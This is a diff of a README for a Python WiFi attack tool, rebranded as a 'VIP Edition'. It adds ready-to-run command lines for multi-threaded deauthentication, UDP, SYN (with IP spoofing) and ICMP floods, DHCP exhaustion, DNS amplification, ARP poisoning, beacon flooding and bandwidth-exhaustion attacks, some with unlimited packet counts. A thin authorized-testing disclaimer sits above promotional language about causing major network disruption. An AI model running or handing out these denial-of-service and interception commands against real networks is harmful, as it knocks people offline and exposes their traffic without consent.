@@ -1,33 +1,42 @@
-# WiFi Security Testing Tool
+# Advanced WiFi Security Testing Tool - VIP Edition 🔥
 
-## ⚠️ DISCLAIMER
+## ⚠️ EXTREME WARNING
 
-**THIS TOOL IS FOR EDUCATIONAL AND AUTHORIZED TESTING PURPOSES ONLY!**
+**THIS IS AN EXTREMELY POWERFUL TOOL FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY!**
 
 - Only use this tool on networks you own or have explicit written permission to test
 - Unauthorized use of this tool against networks you don't own is illegal and unethical
+- This VIP edition can cause significant network disruption - use responsibly
 - The authors are not responsible for any misuse of this tool
 - Always comply with local laws and regulations
 
-## 📋 Description
+## 🚀 Description
 
-This is a comprehensive WiFi penetration testing tool written in Python that implements various attack methods to test the security of wireless networks. The tool is designed for security professionals, network administrators, and researchers to assess the security of their own WiFi networks.
+This is an advanced, multi-threaded WiFi penetration testing suite that implements numerous sophisticated attack methods to comprehensively test network security. The VIP edition includes Layer 2-4 attacks, automated sequences, and high-performance multi-threading capabilities.
 
-## ✨ Features
+## ⚡ VIP Features
 
-### Attack Methods
-1. **Deauthentication Attack** - Disconnects clients from target network
-2. **Beacon Flooding** - Creates fake access points to clutter the airwaves
-3. **Authentication Flooding** - Overwhelms AP with authentication requests
-4. **Probe Request Flooding** - Floods network with probe requests
+### 🔥 Multi-Threaded Attack Methods
+1. **Advanced Deauthentication Attack** - Multi-threaded with multiple deauth reasons
+2. **UDP Flood Attack** - High-intensity multi-threaded UDP flooding
+3. **TCP SYN Flood Attack** - Sophisticated SYN flood with IP spoofing
+4. **ICMP Flood Attack** - Multi-threaded ICMP flooding with large payloads
+5. **DHCP Discover Flood** - Overwhelm DHCP servers with discover requests
+6. **DNS Amplification Attack** - Leverage DNS servers for amplified attacks
+7. **Advanced Beacon Flooding** - Realistic fake AP creation with encryption
+8. **ARP Poisoning/Spoofing** - Man-in-the-middle attack capabilities
+9. **Bandwidth Consumption Attack** - Exhaust network bandwidth resources
 
-### Additional Features
-- Network scanning and discovery
-- Monitor mode setup and management
-- Multiple interface support
-- Configurable packet counts and timing
-- Real-time attack statistics
-- Automatic cleanup and interface restoration
+### 🎯 Advanced Features
+- **Multi-threading support** (up to 100+ concurrent threads)
+- **Automated attack sequences** with JSON configuration
+- **Real-time attack statistics** and monitoring
+- **Layer 2-4 attack capabilities**
+- **Network reconnaissance and target discovery**
+- **Configurable attack parameters**
+- **Attack logging and reporting**
+- **Multiple interface support**
+- **Advanced packet crafting**
 
 ## 🔧 Requirements
 
@@ -79,53 +88,88 @@ This is a comprehensive WiFi penetration testing tool written in Python that imp
    chmod +x wifi_security_tester.py
    ```
 
-## 🚀 Usage
+## 🚀 VIP Usage
 
-### Basic Usage
+### 🎮 Quick Launch Options
 
-1. **Run with root privileges:**
+1. **Quick Attack Script (Recommended):**
    ```bash
-   sudo python3 wifi_security_tester.py
+   sudo ./quick_attack.sh
    ```
 
-2. **Scan for networks:**
+2. **VIP GUI Interface:**
    ```bash
-   sudo python3 wifi_security_tester.py --scan
+   sudo python3 wifi_advanced_gui.py
    ```
 
-### Attack Examples
+3. **Automated Attack Sequence:**
+   ```bash
+   sudo python3 auto_attack.py -i wlan0
+   ```
 
-#### Deauthentication Attack
+### 💥 Advanced Attack Examples
+
+#### Multi-Threaded Deauth Attack
 ```bash
-# Target all clients on a network
-sudo python3 wifi_security_tester.py --deauth -t AA:BB:CC:DD:EE:FF
+# Advanced deauth with 20 threads
+sudo python3 wifi_advanced_tester.py --deauth-advanced --bssid AA:BB:CC:DD:EE:FF -i wlan0 --threads 20
 
-# Target specific client
-sudo python3 wifi_security_tester.py --deauth -t AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66
-
-# Limited packet count
-sudo python3 wifi_security_tester.py --deauth -t AA:BB:CC:DD:EE:FF --count 100
+# Unlimited advanced deauth
+sudo python3 wifi_advanced_tester.py --deauth-advanced --bssid AA:BB:CC:DD:EE:FF -i wlan0 --threads 15 --count 0
 ```
 
-#### Beacon Flooding
+#### High-Intensity UDP Flood
 ```bash
-# Create 1000 fake access points
-sudo python3 wifi_security_tester.py --beacon-flood --count 1000
+# UDP flood with 50 threads, 1472 byte packets
+sudo python3 wifi_advanced_tester.py --udp-flood -t 192.168.1.1 -p 80 --threads 50 --size 1472
 
-# Continuous beacon flooding (Ctrl+C to stop)
-sudo python3 wifi_security_tester.py --beacon-flood
+# UDP flood on multiple ports
+sudo python3 wifi_advanced_tester.py --udp-flood -t 192.168.1.1 -p 443 --threads 30
 ```
 
-#### Authentication Flooding
+#### TCP SYN Flood Attack
 ```bash
-# Flood target AP with auth requests
-sudo python3 wifi_security_tester.py --auth-flood -t AA:BB:CC:DD:EE:FF --count 5000
+# SYN flood with IP spoofing
+sudo python3 wifi_advanced_tester.py --syn-flood -t 192.168.1.1 -p 80 --threads 40
+
+# SYN flood on web services
+sudo python3 wifi_advanced_tester.py --syn-flood -t 192.168.1.1 -p 443 --threads 35
 ```
 
-#### Probe Request Flooding
+#### DHCP Server Exhaustion
 ```bash
-# Flood with probe requests for specific SSID
-sudo python3 wifi_security_tester.py --probe-flood --ssid "TargetNetwork" --count 2000
+# DHCP discover flood with 25 threads
+sudo python3 wifi_advanced_tester.py --dhcp-flood -i wlan0 --threads 25 --count 2000
+
+# Continuous DHCP flooding
+sudo python3 wifi_advanced_tester.py --dhcp-flood -i wlan0 --threads 20
+```
+
+#### DNS Amplification Attack
+```bash
+# DNS amplification with 20 threads
+sudo python3 wifi_advanced_tester.py --dns-amp -t 192.168.1.100 --threads 20
+
+# Targeted DNS amplification
+sudo python3 wifi_advanced_tester.py --dns-amp -t 192.168.1.1 --threads 15
+```
+
+#### Advanced Beacon Flooding
+```bash
+# Create 1000 realistic fake APs with 20 threads
+sudo python3 wifi_advanced_tester.py --beacon-advanced -i wlan0 --threads 20 --count 1000
+
+# Continuous advanced beacon flood
+sudo python3 wifi_advanced_tester.py --beacon-advanced -i wlan0 --threads 15
+```
+
+#### Bandwidth Consumption
+```bash
+# High-bandwidth attack with 100 threads
+sudo python3 wifi_advanced_tester.py --bandwidth-attack -t 192.168.1.1 --threads 100
+
+# Moderate bandwidth consumption
+sudo python3 wifi_advanced_tester.py --bandwidth-attack -t 192.168.1.1 --threads 50
 ```
 
 ### Advanced Options
